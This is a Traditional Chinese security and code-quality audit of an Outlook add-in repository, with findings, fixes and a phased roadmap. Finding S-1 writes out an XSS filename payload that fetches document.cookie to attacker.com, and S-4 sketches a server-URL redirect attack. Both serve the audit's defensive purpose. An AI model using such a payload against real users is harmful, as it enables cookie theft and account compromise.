# APX.AI Outlook Add-in 全面健檢報告

**版本**：v1.0
**日期**：2026-05-18
**範圍**：整個 `apx.ai-outlook-addin/` repo(`outlook/`、`shared/`、`manifest.xml`、`docs/`、設定檔)
**目標**：從「拼接而成的早期碼」升級為「企業級世界一流產品」
**前提**：後端 API 端點(`apxpoc.ioneit.com`)**暫不確定能否修改** — 因此本報告會在每項發現旁標註 `[Client]` (可在前端解決) / `[Server]` (需後端配合) / `[Client+Server]` (兩端皆需動)。

---

## 0. TL;DR(給趕時間的閱讀者)

**現況體質**：核心流程能跑、模組分層概念正確、JSDoc 不錯,但**整體屬於早期 PoC 等級**,離企業級產品尚有相當距離。最關鍵的三個阻塞點:

1. **資安**:5 個 Critical(含 XSS、明文存密、Base64「偽加密」、Server URL 不驗 HTTPS、登入前不驗證帳密),沒有 CSP,沒有 SRI(部分),沒有 token-based session。
2. **工程基礎**:沒有 bundler、沒有 TypeScript、零測試、零 CI/CD、READ ME 只有一行、`successView` 在程式碼有呼叫但 HTML **根本沒這個 view**(功能性 bug)。
3. **產品質感**:Bootstrap 預設樣式、無上傳進度條、無 drag-and-drop、無焦點管理、無 a11y、無 dark mode 驗證、Outlook taskpane 用 `vh-100` 排版會錯位。

**建議路線**:分 4 個 Phase 推進(P0 急救 → P1 工具鏈現代化 → P2 安全強化 → P3 UI/UX 重塑 + 上架準備),總工期估 6-10 週(單一資深工程師)。

---

## 1. 專案現況快照

### 1.1 規模
- **檔案數**:`outlook/` 9 個 .js + 1 html、`shared/` 5 個 .js、根目錄 manifest + 2 個 HTML、`docs/` 4 個 md
- **總 LOC**:約 1,800 行 JS + 230 行 HTML
- **依賴**:純 dev deps(eslint + office-addin-manifest + yo + generator-office),**零 runtime deps**(全部從 CDN 直接載入 Bootstrap)

### 1.2 技術棧
- Vanilla JavaScript(IIFE 模式 + `window.*` 全域命名空間)
- Bootstrap 5.3.2 + Bootstrap Icons 1.11.3(CDN)
- Office.js(Outlook Add-in v1.1 manifest XML)
- IndexedDB(主) + RoamingSettings(fallback)
- 部署:GitHub Pages(`bingjyun.github.io/apx-outlook-addin`)

### 1.3 缺少的關鍵基礎建設

| 類別 | 狀態 |
|---|---|
| Bundler / Transpiler | ❌ 無 |
| TypeScript | ❌ 無 |
| 單元測試 | ❌ 無 |
| E2E 測試 | ❌ 無(只有手動測試文件) |
| CI/CD pipeline | ❌ 無(沒有 `.github/workflows/`) |
| Pre-commit hooks | ❌ 無(沒有 husky/lint-staged) |
| Prettier | ❌ 無 |
| 錯誤監控(Sentry 等) | ❌ 無 |
| `npm run lint` / `test` / `build` 腳本 | ❌ 全無(`package.json` 沒有 `scripts` 區段) |
| 完整 README | ❌ 只有一行 `# apx-outlook-addin` |
| 架構文件 | ❌ 只有 PRD + roadmap |
| 變更紀錄 / CHANGELOG | ❌ 無 |

---

## 2. 安全發現(按 OWASP Top 10 分類)

### 🔴 Critical

#### S-1. XSS — 檔名與 baseUrl 未跳脫即注入郵件本文 `[Client]`
- **位置**:[outlook/link-inserter.js:19](outlook/link-inserter.js#L19)
- **OWASP**:A03 Injection
- **現況**:
  ```js
  const linkHtml = `${getMessage('UPLOAD_LINK_PREFIX')}<br>${
    getMessage('UPLOAD_LINK_BODY')
      .replace('{fileName}', fileName)   // ← 未跳脫
      .replace('{baseUrl}', baseUrl)     // ← 未跳脫
  }`;
  Office.context.mailbox.item.body.prependAsync(linkHtml, { coercionType: Office.CoercionType.Html }, ...);
  ```
- **攻擊**:使用者上傳 `evil<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>.pdf`,收件人開信時自動觸發 JS。
- **修法**:跳脫所有插入 HTML 的字串。
  ```js
  const esc = (s) => String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
  // 或引入 DOMPurify
  ```

#### S-2. 帳密以明文存在瀏覽器 7 天 `[Client]`
- **位置**:[shared/storage-core.js:40-45](shared/storage-core.js#L40), [outlook/storage-adapter.js:248-251](outlook/storage-adapter.js#L248)
- **OWASP**:A02 Cryptographic Failures
- **現況**:`saveCredentialsData: (account, password) => ({ account, password, ... })` — 直接寫進 IndexedDB / RoamingSettings,毫無加密。
- **附加風險**:RoamingSettings **會跨裝置同步**,等於把使用者密碼推到所有他登入 M365 的裝置上。
- **修法選項**:
  - **A(最佳)**:改用 token-based session — 登入時送一次帳密換取 JWT/refresh token,只快取 token 不快取密碼。`[Client+Server]`
  - **B(中間)**:用 Web Crypto API 以使用者私鑰密碼(`keyPwd`)為來源,PBKDF2 衍生 AES-GCM 金鑰加密本地帳密。每次操作要再輸入私鑰密碼解開。`[Client]`
  - **C(最低)**:至少不再用 RoamingSettings,只用 IndexedDB(同源、不跨裝置);並在 `auth-handler.js:bindLoginBtn` 提交後立刻 `loginPwd.value = ''` 清掉 DOM 殘留。`[Client]`

#### S-3. 私鑰用 Base64 編碼 ≠ 加密 `[Client]`
- **位置**:[shared/utils.js:31](shared/utils.js#L31)
- **OWASP**:A02 Cryptographic Failures
- **現況**:`const getPrivateKeyBase64 = (keyContent) => btoa(keyContent);` 然後存入 storage。Base64 是編碼,不是加密 — 任何能讀到 storage 的人都能 `atob()` 取回明文私鑰。
- **諷刺點**:UI 上要求使用者輸入「私鑰密碼」`keyPwdInput`,但這個密碼**從未被使用**(`auth-handler.js:82-96` 拿到值後沒餵給任何加密/驗證函式),純粹是裝飾。
- **修法**:用 `keyPwd` 透過 PBKDF2 衍生金鑰,將私鑰 AES-GCM 加密後再存。或乾脆每次上傳時重新讀檔,不要快取在瀏覽器。`[Client]`

#### S-4. Server URL 不驗證 protocol / domain,可被導向任意主機 `[Client]`
- **位置**:[outlook/auth-handler.js:19-35](outlook/auth-handler.js#L19), [outlook/storage-adapter.js:286-288](outlook/storage-adapter.js#L286)
- **OWASP**:A02 Cryptographic Failures + A10 SSRF-adjacent
- **現況**:`normalizeBaseUrl` 只去掉末尾 `/`,使用者輸入 `http://attacker.com` 也照收。
- **攻擊**:釣魚郵件誘導使用者把 server URL 改成 `http://attacker.com`,之後所有上傳的檔案、帳密、Base64 私鑰全部送到攻擊者手上。
- **修法**:
  ```js
  const validateServerUrl = (raw) => {
    const u = new URL(raw);
    if (u.protocol !== 'https:') throw new Error('Must use HTTPS');
    const ALLOWED = ['ioneit.com'];  // 或從企業 admin 注入白名單
    if (!ALLOWED.some(d => u.hostname === d || u.hostname.endsWith('.'+d))) {
      throw new Error('Domain not allowed');
    }
    return u.toString().replace(/\/$/, '');
  };
  ```

#### S-5. 登入按鈕不呼叫後端驗證,直接存進 storage `[Client+Server]`
- **位置**:[outlook/auth-handler.js:46-65](outlook/auth-handler.js#L46)
- **OWASP**:A07 Authentication Failures
- **現況**:`bindLoginBtn` 只檢查非空就 `apxStorage.saveCredentials()`,然後切到下一個 view。**沒有任何後端驗證**。錯誤密碼會在後續上傳時才爆掉。
- **影響**:(1) 使用者體驗差(到下個畫面才知道密碼錯);(2) 沒有 brute force 限制;(3) `try/catch` 用空 `catch {}` 吞掉所有錯誤訊息。
- **修法**:加一支 `POST /gmailapi/auth/login`,登入按鈕先打 API,成功才存。`[Server]` 提供 API 後 `[Client]` 改接。

### 🟠 High

#### S-6. 沒有 CSP meta tag `[Client]`
- **位置**:[outlook/taskpane.html](outlook/taskpane.html)
- **修法**:在 `<head>` 加上嚴格 CSP:
  ```html
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'none';
    script-src 'self' https://appsforoffice.microsoft.com https://cdn.jsdelivr.net;
    style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
    font-src https://cdn.jsdelivr.net;
    img-src 'self' data:;
    connect-src https://apxpoc.ioneit.com https://*.ioneit.com;
    frame-ancestors 'none';
    base-uri 'self';
  ">
  ```
- **進階**:CDN 資產 self-host 後,`script-src` 可緊縮到 `'self'`。

#### S-7. Bootstrap Icons 沒有 SRI 雜湊 `[Client]`
- **位置**:[outlook/taskpane.html:11](outlook/taskpane.html#L11)
- **現況**:Bootstrap CSS/JS 有 SRI,但 Bootstrap Icons 那一行沒有 `integrity=` 屬性。
- **修法**:加上 SRI 或改用 self-host。

#### S-8. 7 天 expiry 只在客戶端檢查,可被竄改 `[Server]`
- **位置**:[shared/storage-core.js:14-17](shared/storage-core.js#L14)
- **現況**:`isAuthExpired(timestamp)` 純前端判斷,使用者打開 DevTools 改 timestamp 即可永久有效。
- **修法**:後端發 session token 內含 server-side `exp` claim,所有 API 強制驗 token。`[Server]`

#### S-9. 沒有檔案類型/大小驗證(客戶端) `[Client]`
- **位置**:[outlook/upload-handler.js:25-44](outlook/upload-handler.js#L25)
- **現況**:只檢查 `!file`,任何類型大小都收。
- **修法**:加 whitelist + 上限檢查(企業常見 black-list:`.exe`、`.bat`、`.scr`、`.js`、`.vbs`)+ 顯示友善錯誤。也務必後端再驗一次。`[Client+Server]`

#### S-10. 沒有 brute-force 防護 `[Server]`
- **位置**:整個 login flow
- **修法**:後端做 IP/帳號 rate limit;前端做 button disable + exponential backoff。

### 🟡 Medium

#### S-11. `keyPwdInput`(私鑰密碼欄位)有輸入但完全未使用 `[Client]`
- 既誤導使用者(以為有加密),又佔位 UI 空間。要嘛**真的拿來加密私鑰**(見 S-3 修法),要嘛**移除這個欄位**。

#### S-12. 多 tab 登出不同步 `[Client]`
- 用 `BroadcastChannel` 或 `storage` event 在登出時通知其他 tab。

#### S-13. 沒有 Logout 後清乾淨密碼 input 殘留 `[Client]`
- `bindLogoutBtn` 應另做 `loginPwd.value=''; keyPwdInput.value='';`。

#### S-14. 下載連結沒有 token / 沒有過期機制 `[Server]`
- 任何人拿到連結 + 知道收件帳號就能下載。`[Server]` 應改為帶簽章 token 的連結。

#### S-15. 沒有檔案完整性驗證(downloadService) `[Server]`
- 後端應在 upload response 回傳 SHA-256,下載端比對。

#### S-16. RoamingSettings 同步明文資料到所有裝置 `[Client]`
- 拔掉 RoamingSettings fallback,只用 IndexedDB(同源,不跨裝置)。

### 🔵 Low / Informational

| ID | 議題 | 位置 | 修法 |
|---|---|---|---|
| S-17 | API response 沒有 schema 驗證 | apiService.js | 加 zod / ajv |
| S-18 | 沒 audit log | All API calls | 後端統一補 |
| S-19 | `console.error` 散落各處 | 多檔 | 統一走 errorHandler.log |
| S-20 | 沒有上傳 confirm dialog | upload-handler.js | 大檔上傳前 confirm |

---

## 3. 程式碼可靠性與健全性

### 🔴 Critical

#### R-1. `showSuccess()` 呼叫不存在的 `successView` — 功能性 Bug
- **位置**:[outlook/view-switcher.js:90-96](outlook/view-switcher.js#L90), [shared/constants.js](shared/constants.js)(`VIEWS.SUCCESS` 已定義)
- **現況**:`link-inserter.js:37` 上傳成功時呼叫 `viewSwitcher.showSuccess('SUCCESS')`,但 `taskpane.html` 中**沒有** `<div data-view="successView">` 元素 → 所有 view 都被 hide,使用者看到**白畫面**。
- **修法**:在 [outlook/taskpane.html:123 之前](outlook/taskpane.html#L123) 加 successView:
  ```html
  <div id="successView" class="view" data-view="successView">
    <div class="d-flex flex-column align-items-center text-center p-3">
      <i class="bi bi-check-circle-fill text-success" style="font-size: 3rem;"></i>
      <p class="mt-3" data-key="SUCCESS_MESSAGE"></p>
    </div>
  </div>
  ```

#### R-2. `_attachment-handler.js` 是空殼 — 自動觸發功能未實作
- **位置**:[outlook/_attachment-handler.js](outlook/_attachment-handler.js)
- **現況**:檔名 `_attachment-handler.js` 開頭底線顯然是「未實作占位」,內容只有空 IIFE。PRD §2 的「>25MB 自動觸發 Taskpane」實際是搬到 `view-switcher.js:270-294` `onAttachmentsChanged`,但這個檔案還留著製造混亂。
- **修法**:刪除空殼,或把 `onAttachmentsChanged` 邏輯遷出 `view-switcher.js` 到這個檔(`view-switcher` 已 364 行,違反 PRD ≤300 行規則)。

#### R-3. `view-switcher.js` 過肥(364 行,違反 PRD 規範) — 6 個職責混合
- **位置**:[outlook/view-switcher.js](outlook/view-switcher.js)
- **現況**:同時負責 (1) view 切換、(2) i18n 文字注入、(3) 收件人讀取 + 重試、(4) 主題監聽、(5) 附件監聽、(6) `Office.onReady` orchestration。
- **修法**:拆成
  - `view-switcher.js` — 純 view 切換(showView/hideAll/showSuccess,~80 行)
  - `recipient-loader.js` — 收件人讀取(含重試,~80 行)
  - `theme-adapter.js` — Office 主題(~40 行)
  - `attachment-watcher.js` — 補實 `_attachment-handler.js`(~60 行)
  - `app-bootstrap.js` — `Office.onReady` orchestrator + DOM ready(~80 行)

#### R-4. `promisifyOfficeCall` 在 `result.error` 為 undefined 時會丟難讀錯誤
- **位置**:[outlook/view-switcher.js:24](outlook/view-switcher.js#L24)
- **現況**:`new Error(\`Office API 呼叫失敗：${result.error.message}\`)` — 若 `result.error` 為 undefined,丟出 `Cannot read property 'message' of undefined`。
- **修法**:`result.error?.message ?? result.error ?? 'Unknown Office error'`。

### 🟠 High

#### R-5. 所有 `catch {}` 都吞掉了真實錯誤
- **位置**:[outlook/auth-handler.js:32,62,98,116](outlook/auth-handler.js#L32) (4 處)
- **現況**:`catch { window.errorHandler.handleAuthError('AUTH_EXPIRED'); }` — 不管什麼錯都顯示成「認證過期」,且**沒有 log 原始錯誤**。
- **修法**:`catch (err) { window.errorHandler.log('error', '...', err); window.errorHandler.handleAuthError('AUTH_EXPIRED'); }`,且 inline error 應顯示具體訊息(已在 upload-handler 做了,login 三處還沒)。

#### R-6. 沒有 button-disable / re-entrant guard,可重複觸發
- **位置**:[outlook/upload-handler.js:80-91](outlook/upload-handler.js#L80), [outlook/auth-handler.js](outlook/auth-handler.js)
- **現況**:使用者連點 Upload/Login 會送多筆請求。
- **修法**:統一寫個 `withGuard(btn, async fn)` helper,進入時 `btn.disabled = true`,完成時恢復。

#### R-7. `loadRecipientInfo` 對 email 格式的處理脆弱
- **位置**:[outlook/view-switcher.js:120-122](outlook/view-switcher.js#L120)
- **現況**:`firstRecipient.emailAddress || firstRecipient` 然後 `.split('@')[0]`。若 Office.js 回傳的是物件而非字串,`.split` 會炸。`email` 為 `undefined` 時 `.split` 不會被執行,但邏輯隱晦。
- **修法**:type-guard + 驗證 email 格式:
  ```js
  const email = typeof firstRecipient === 'string' ? firstRecipient
    : firstRecipient?.emailAddress;
  if (!email || !email.includes('@')) return { email: null, memberReceiveAcc: null };
  ```

#### R-8. 收件人重試固定 3 次 × 1 秒 — 慢網路 UX 差
- **位置**:[outlook/view-switcher.js:158-166](outlook/view-switcher.js#L158)
- **修法**:exponential backoff(500ms → 1s → 2s → 4s),最多 5 次。

#### R-9. IndexedDB open 沒 timeout,可能無限 hang
- **位置**:[outlook/storage-adapter.js:35-55](outlook/storage-adapter.js#L35)
- **修法**:用 `Promise.race` 套 5 秒 timeout。

#### R-10. `link-inserter.js:37` 觸發 `showSuccess` 但接著就 `closeContainer` — 競態
- **位置**:[outlook/link-inserter.js:37-41](outlook/link-inserter.js#L37)
- **現況**:呼叫 `showSuccess` 後 `sleep(SUCCESS_CLOSE_DELAY)` 再 close。問題:`showSuccess` 嘗試切到不存在的 successView(見 R-1),sleep 期間 UI 是白的。
- **修法**:先修 R-1,然後改用顯式 timing。

#### R-11. `bindCancellableUpload` 之類取消機制完全缺失
- 25MB 上傳中使用者沒辦法取消,只能等。應加 `AbortController`。

### 🟡 Medium

#### R-12. Taskpane URL 在兩處硬寫死
- [outlook/ribbon-handler.js:17](outlook/ribbon-handler.js#L17), [outlook/view-switcher.js:278](outlook/view-switcher.js#L278) — 抽到 `outlook/constants.js`。

#### R-13. 全域命名空間污染 `window.*`
- 12 個 `window.xxx`,沒有 namespace。改成 `window.APX = { storage, auth, ui, ...}`。Phase 2 模組化後天然解決。

#### R-14. 模組載入順序由 `<script>` tag 維護,易壞
- [outlook/taskpane.html:134-146](outlook/taskpane.html#L134) — 11 個 script tag 依序載入,任何一個依賴調整都會壞。Phase 2 改 ESM import 後解決。

#### R-15. 沒有 module-ready guard,Office.onReady 內訪問 `window.errorHandler` 在某些瀏覽器可能 race
- 把所有 IIFE 改成 `window.dispatchEvent(new CustomEvent('apx:module-ready', {detail:'name'}))`,或直接 Phase 2 改 ESM。

### 🔵 Low

| ID | 議題 |
|---|---|
| R-16 | `eslint.config.js` 已禁 `localStorage`/`sessionStorage`,但沒禁 `alert`/`confirm`/`prompt`(在 Add-in 環境會被擋) |
| R-17 | `no-magic-numbers` 太嚴格,大量 `3`/`1000` 之類常見值要 const |
| R-18 | `.gitignore` 沒有 `.DS_Store` 但 repo 已經有殘留 `.DS_Store`(根目錄、docs/、outlook/ 都有) |
| R-19 | `package.json` 沒有 `scripts` 區段,沒有 `name`/`version`/`license`/`repository` |
| R-20 | `manifest.xml` `Version` 寫 `1.1.0.0`,但 README/PRD 都沒 changelog |

---

## 4. 架構與抽象品質

#### A-1. `shared/` 與 `outlook/` 的分層概念正確,但 `shared` 直接讀 `window.*` 形成隱性循環依賴
- **位置**:[shared/storage-core.js:16](shared/storage-core.js#L16) 讀 `window.constants`、[shared/apiService.js:18](shared/apiService.js#L18) 讀 `window.apxStorage`
- **問題**:`shared/` 不該知道 outlook adapter 存在。應反過來 — `shared/` 接受 `storage` 介面注入。
- **修法**(Phase 2 一併處理):
  ```ts
  // shared/apiService.ts
  export function createApiService(deps: { loadServerUrl: () => Promise<string> }) { ... }
  // outlook/bootstrap.ts
  const api = createApiService({ loadServerUrl: storage.loadServerUrl });
  ```

#### A-2. 沒有清楚的 state 管理
- 認證狀態散落在 storage(authData.isAuthenticated)、view-switcher(當前 view)、auth-handler(button binding)。
- **修法**:用一個 reducer pattern(或最小化的 state machine — `xstate` 或自己寫一個 100 行的 FSM)管理 `Unauthenticated → ServerSet → Credentialed → KeyVerified → Ready` 狀態。

#### A-3. 沒有 error type system
- 全部都丟 `new Error(string)`。建議區分 `AuthError`、`NetworkError`、`ValidationError`、`ServerError`,error-handler 根據型別決定 view 切換。

#### A-4. `error-handler` 的 `log` 只在記憶體,沒有持久化也沒有遠端 reporting
- Phase 4 接 Sentry。

#### A-5. `constants.js` 沒看到,但 PRD 指它有 `getMessage('KEY', 'zhTW')` 雙語,實際 outlook/constants.js 只是 merge DB_NAME 等。**得看 shared/constants.js 全文**才能評估 i18n 設計。(註:本檔 9KB 略大,需要另檢)

#### A-6. 沒有 dependency injection,測試極難寫
- 全靠 `window.*`,單元測試要 mock 整個 window — 痛苦。Phase 2 ESM 後問題自然消失。

---

## 5. UI / UX 質感

### 🔴 P0

#### U-1. `loadingView` 用 `vh-100` 在 350px taskpane 內排版錯位
- **位置**:[outlook/taskpane.html:116](outlook/taskpane.html#L116)
- **現況**:`d-flex flex-column align-items-center justify-content-center vh-100` 把 spinner 撐到視口全高,在 350×600 taskpane 內就是錯誤排版。
- **修法**:改用 `min-vh-50` 或自訂 `min-height: 200px`。

#### U-2. 沒有 `successView`(同 R-1),上傳成功瞬間白畫面再 close
- 體驗極差。

#### U-3. 沒有上傳進度條 / 百分比 / 取消鈕
- 25MB 上傳期間使用者只看到「檔案上傳中...」固定文字,以為當機。
- **修法**:用 `XMLHttpRequest.upload.onprogress` 或 fetch + ReadableStream 抓進度,顯示百分比 + 速度 + 可取消按鈕。

### 🟠 P1

#### U-4. Bootstrap 預設樣式 — 沒有品牌識別
- 沒有自訂顏色、間距、字體、按鈕風格。看起來就是「免費模板」。
- **修法**:建立 `outlook/styles/` 資料夾,定義 CSS variables(`--apx-primary`, `--apx-gap-md` 等),覆蓋 Bootstrap。可參考 Microsoft Fluent UI 的視覺語言讓 Outlook 使用者感覺自然。

#### U-5. 沒有 a11y 基礎建設
- 所有 input 沒有 `<label for>` 或 `aria-label`
- view 切換沒做 focus management(`view-switcher.js:75-82` showView 不移焦點)
- 沒有 `aria-live` 區域宣告狀態變化
- Bootstrap 預設色在 Outlook dark theme 可能不達 WCAG AA 對比度
- **修法**:每個 input 加 `aria-label`,`showView` 後 `view.querySelector('input,button')?.focus()`,`uploadStatus` 加 `aria-live="polite"`。

#### U-6. 沒有 drag-and-drop 上傳
- 純 `<input type="file">`,在 350px taskpane 內按鈕極小。
- **修法**:整個 mainView 區域當 drop zone,`dragover` 時加邊框高亮。

#### U-7. 沒有 Office Theme 完整適配
- `view-switcher.js:applyTheme` 只設了 `body` 背景與文字色,沒覆蓋 input/button/border。
- 最近 commit `de87eb6` 把背景強制改成 #ffffff,**反而把 Office dark theme 整個關掉了**(`taskpane.html:15`)。
- **修法**:全面審視 light/dark 兩種 Office theme,用 CSS variables 控制所有顏色。

#### U-8. 錯誤/成功/loading 狀態視覺區分不夠
- `uploadStatus` 用同一個 `<div>` 顯示所有狀態,只靠文字內容辨識。
- **修法**:錯誤套 `.text-danger` + 紅色 icon,成功套 `.text-success` + 綠色 icon,處理中套 spinner。已有 `showInlineError` 加了 `text-danger` 是好開始,但成功狀態沒對等處理。

#### U-9. Server URL input 沒有即時驗證
- 修法:input 事件加 inline 驗證提示(invalid feedback)。

#### U-10. 私鑰檔案選擇後沒有確認回饋
- 使用者選了檔案但 UI 沒變化,容易以為沒選到。
- **修法**:`change` 事件後顯示檔名 + 大小 + ✓ icon。

#### U-11. 沒有版本顯示 + 「Report Issue」入口
- 修法:畫面底部加 `<footer class="text-muted small">v1.1.0 · <a>回報問題</a></footer>`,點擊開啟預填 GitHub Issue。

### 🔵 P2

| ID | 議題 |
|---|---|
| U-12 | 沒有首次使用 onboarding(短 tutorial 或 tooltip) |
| U-13 | 沒有「7 天內免再登入」的剩餘時間顯示 |
| U-14 | 沒有微互動(view 切換、按鈕點擊回饋動畫) |
| U-15 | Logout/Refresh 兩顆按鈕用 `position-absolute` 在 350px 寬可能蓋到 logo |
| U-16 | Bootstrap Icons 整套引入但只用 2 個圖示(eye/eye-slash) — 浪費頻寬,改 inline SVG |

---

## 6. 測試與工具鏈

#### T-1. **零測試覆蓋率**
- 修法(Phase 2):
  - **單元測試**:Vitest + jsdom + `@office-addin-mock` mock Office.context
  - **覆蓋目標檔**:`storage-core`、`storage-adapter`、`apiService`、`downloadService`、`utils`、`auth-handler` 邏輯部分
  - **目標覆蓋率**:核心 80%、整體 60%
- **E2E**:Playwright 跑 `taskpane.html`(脫離 Outlook 的 sideload 環境,mock `window.Office`)
- **整合測試**:啟一個 mock 後端(MSW),驗整條 upload flow

#### T-2. **零 CI/CD**
- 修法:`.github/workflows/ci.yml` 跑 lint + test + build + manifest validate,PR 必過。

#### T-3. **沒有 manifest validation 在 CI**
- 修法:`office-addin-manifest validate manifest.xml` 加入 CI。

#### T-4. **沒有自動發佈到 GitHub Pages**
- 現況推測手動 push 到 main branch,deploy gh-pages。
- 修法:`.github/workflows/deploy.yml` 處理。

#### T-5. **沒有 Prettier / EditorConfig**
- 整個 repo 沒有統一 formatter 規則,看 git log 不同 commit 有不同縮排習慣。

#### T-6. **沒有 pre-commit hook**
- 修法:husky + lint-staged 在 commit 前跑 eslint + prettier。

#### T-7. **沒有 commit message convention**
- 看 git log 有 `fix:`/`docs:`/`feat:`/`refactor:` — 已用 Conventional Commits,但沒文件化也沒 lint。
- 修法:commitlint + Conventional Commits 文件化。

#### T-8. **package.json 缺 metadata + scripts**
- 修法:
  ```json
  {
    "name": "apx-outlook-addin",
    "version": "1.1.0",
    "license": "PROPRIETARY",
    "repository": { "type": "git", "url": "..." },
    "scripts": {
      "dev": "vite",
      "build": "vite build",
      "lint": "eslint .",
      "format": "prettier --write .",
      "test": "vitest",
      "test:e2e": "playwright test",
      "validate-manifest": "office-addin-manifest validate manifest.xml"
    }
  }
  ```

---

## 7. 文件與發佈準備

#### D-1. README 只有一行
- 重寫:Quickstart、Architecture、Build、Sideload、Deploy、Contributing、License

#### D-2. 沒有 ARCHITECTURE.md
- 補:模組依賴 DAG(Mermaid)、view state machine、Office.js 初始化順序、storage fallback 策略、安全邊界

#### D-3. 沒有 CHANGELOG.md
- 補:Keep a Changelog 格式

#### D-4. 沒有 LICENSE
- 補:依公司決定(MIT? Apache? Proprietary?)

#### D-5. 沒有 SECURITY.md
- 補:vulnerability disclosure policy

#### D-6. 沒有 CONTRIBUTING.md
- 補:code style、commit convention、PR process

#### D-7. `privacy.html` / `support.html` 內容沒檢視
- 應有清楚的資料蒐集、保留期、聯絡窗口

#### D-8. 沒有 AppSource 上架素材(screenshots、demo video、長短描述)
- 若目標上架,需準備

---

## 8. Manifest 與部署

#### M-1. `AppDomains` 只 lock 到 `https://apxpoc.ioneit.com` — 企業客戶不能改 URL
- 矛盾點:UI 允許企業客戶輸入自家 server URL,但 manifest 沒允許那些 domain。實際打到非 AppDomain 的 URL 會被 Office 擋掉(或在 frame-ancestors 處 break)。
- 修法:或者真的鎖一個固定 URL,或者改 manifest 為 wildcard,或者上架時 per-tenant 客製化。

#### M-2. `Permissions` 是 `ReadWriteMailbox`,範圍極大
- 上架 AppSource 時 Microsoft 審查會問:你有用到 ReadWriteMailbox 中的什麼權限?目前只用到 `item.to`、`item.attachments`、`item.body.prependAsync`。
- 修法:可能降到 `ReadWriteItem`(較窄)。

#### M-3. `SupportUrl` 指向 github.io,正式上架建議改企業域名

#### M-4. Icons 從 GitHub CDN 拉 — 若 GitHub Pages 掛掉 add-in 圖示直接消失
- 修法:icons 改自己 hosting,或上架後使用 AppSource CDN

---

## 9. 分階段路線圖

> 設計原則:**先止血、再現代化、再強化、最後上架**。每一個 Phase 都應結束於可 demo 可 ship 的狀態。

### Phase 0 — 急救與功能性 Bug 修復(1 週)

**目標**:消除立即可見的 bug,清掉技術債小石頭,讓現有功能真的能正常用。**不動架構**。

| 項目 | 對應發現 | 工時 |
|---|---|---|
| 加上 `successView` HTML 並把樣式做好 | R-1, U-2 | 1h |
| `loadingView` 改掉 `vh-100` | U-1 | 30min |
| 刪除空殼 `_attachment-handler.js` 或補上實作 | R-2 | 30min |
| 統一 `catch {}` 都改成 `catch(err)` 並 log | R-5 | 2h |
| `promisifyOfficeCall` 補 null check | R-4 | 15min |
| 上傳/登入按鈕加 re-entrant guard | R-6 | 1h |
| 抽取 Taskpane URL 常數 | R-12 | 15min |
| Login 三處 `catch` 改為 inline error 顯示具體訊息 | R-5 | 1h |
| 收件人 retry 改 exponential backoff | R-8 | 30min |
| IndexedDB open 加 timeout | R-9 | 30min |
| **XSS 修復**(fileName/baseUrl 跳脫) | S-1 | 1h |
| **Server URL 驗證**(HTTPS + domain) | S-4 | 1h |
| 移除明文 RoamingSettings fallback(只剩 IndexedDB) | S-16 | 1h |
| Logout 後清空 password input | S-13 | 15min |
| `.gitignore` 補上 `.DS_Store`,清乾淨 repo 內殘留 | R-18 | 15min |
| `package.json` 加 metadata + scripts(空骨架) | T-8, R-19 | 30min |
| 重寫 README(Quickstart + Sideload) | D-1 | 2h |

**驗收**:全部功能跑一輪 e2e、ESLint 0 error、開兩種 Outlook theme 看排版、上傳 25MB 檔案完整流程通。

---

### Phase 1 — 工具鏈現代化(2-3 週)

**目標**:導入 Vite + TypeScript + Vitest + Playwright + CI/CD。**不改業務邏輯**(每個函式語意保持),只搬家加型別。

#### 1.1 建置 build pipeline(3 天)
- 引入 Vite,設定 multi-entry(`taskpane.html` 為 root)
- 設定 dev server 支援 HTTPS(Office Add-in 必須 HTTPS sideload)
- Production build 輸出到 `dist/`,GitHub Pages 改部署 `dist/`

#### 1.2 TypeScript 遷移(1 週)
- 漸進式:先全改 `.ts`,啟用 `strict: true`、`noImplicitAny`
- 把 `window.*` 改成 ESM `import`,刪除全部 IIFE
- 定義型別:`AuthData`、`ServerUrlData`、`ApiResponse`、`UploadParams`、`Recipient` 等
- 引入 `@types/office-js` 取代手動註解
- 把 shared/ 改成接受 dependency injection(A-1)

#### 1.3 測試框架(3 天)
- Vitest + jsdom,寫單元測試:
  - `storage-core` 100%
  - `storage-adapter` 80%(mock IndexedDB)
  - `apiService` 80%(MSW mock fetch)
  - `utils` 100%
  - `error-handler` 80%
  - `auth-handler` 邏輯部分(button binding 邏輯抽出)
- Playwright + Office.js mock 跑 happy path E2E

#### 1.4 CI/CD(2 天)
- `.github/workflows/ci.yml`:lint + typecheck + test + build + manifest-validate
- `.github/workflows/deploy.yml`:main branch push → 自動 deploy 到 GitHub Pages
- Branch protection rule:PR 需通過 CI

#### 1.5 開發體驗(1 天)
- Prettier + EditorConfig
- Husky + lint-staged pre-commit hook
- Commitlint(Conventional Commits)

**驗收**:`npm run dev` 起 HTTPS dev server、`npm test` 跑出覆蓋率報告、PR 觸發 CI、main push 自動上線。

---

### Phase 2 — 架構重塑與安全強化(2-3 週)

**目標**:把純客戶端可解的安全問題全修,並把架構提升到企業級。

#### 2.1 模組拆分(R-3)
- 拆 `view-switcher.js` 為 5 個子模組
- 引入簡易 state machine(state 管理 A-2)
- 定義 Error 型別系統(A-3)

#### 2.2 客戶端可做的安全強化
- CSP meta tag(S-6)
- Bootstrap Icons 加 SRI(S-7)
- 檔案類型/大小驗證(S-9 客戶端部分)
- 多 tab 登出同步(S-12)
- 拔掉 `keyPwdInput` 或真正使用它加密私鑰(S-3, S-11)
- 用 Web Crypto API + PBKDF2 加密本地 storage(S-2 選項 B)

#### 2.3 需要後端配合的安全項目(列 backlog)
- S-2 選項 A(JWT/refresh token)
- S-5(login API 驗證)
- S-8(server-side session)
- S-10(rate limit)
- S-14(下載連結 token)
- S-15(檔案 SHA-256)

> 若後端方願意配合,Phase 2 加碼 1 週做 S-5 + S-8。

#### 2.4 觀測性
- 引入 Sentry(免費方案足夠)
- 自家 telemetry endpoint(可選)

**驗收**:OWASP ZAP 跑一輪 baseline scan 無 High 以上、ESLint security plugin 跑 0 issue。

---

### Phase 3 — UI/UX 重塑與品牌化(2-3 週)

**目標**:從「免費模板感」升級為「企業級產品」。

#### 3.1 設計系統建立
- 定義 design tokens(顏色、間距、字體、陰影、圓角)
